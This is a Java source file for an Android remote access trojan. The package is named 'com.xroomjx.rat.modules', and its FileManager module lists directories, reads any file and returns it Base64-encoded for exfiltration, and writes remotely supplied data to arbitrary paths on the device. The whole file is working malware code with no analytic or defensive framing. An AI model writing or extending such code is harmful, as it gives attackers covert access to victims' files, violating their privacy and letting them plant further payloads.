package com.xroomjx.rat.modules;

import android.util.Base64;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class FileManager {
    public static String listFiles(String path) {
        try {
            File dir = new File(path);
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder();
            if (files != null) {
                for (File f : files) {
                    sb.append(f.isDirectory() ? "[DIR] " : "[FILE] ")
                      .append(f.getName())
                      .append(" (").append(f.length()).append(" bytes)\n");
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    public static String download(String path) {
        try {
            File file = new File(path);
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            return Base64.encodeToString(data, Base64.NO_WRAP);
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    public static String upload(String args) {
        try {
            // args format: {"path":"/sdcard/file.txt","data":"base64data"}
            org.json.JSONObject json = new org.json.JSONObject(args);
            String path = json.getString("path");
            byte[] data = Base64.decode(json.getString("data"), Base64.NO_WRAP);
            FileOutputStream fos = new FileOutputStream(path);
            fos.write(data);
            fos.close();
            return "uploaded";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
